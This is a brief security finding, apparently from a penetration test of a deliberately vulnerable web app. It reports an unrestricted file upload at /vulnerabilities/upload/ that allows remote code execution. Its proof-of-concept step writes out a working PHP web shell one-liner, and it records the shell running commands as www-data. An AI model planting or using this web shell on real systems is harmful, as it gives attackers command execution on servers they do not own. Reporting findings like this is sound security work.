title: Unrestricted File Upload - Remote Code Execution
proof: Uploaded PHP files (shell.php, shell.phtml) via form to /vulnerabilities/upload/. Both confirmed accessible and executable at /hackable/uploads/shell.php?cmd=id returning 'uid=33(www-data)'. No file type verification - PHP and PHTML extensions accepted. Shell provides full RCE as www-data.
poc_steps: Create file with content <?php echo system($_GET['cmd']); ?>
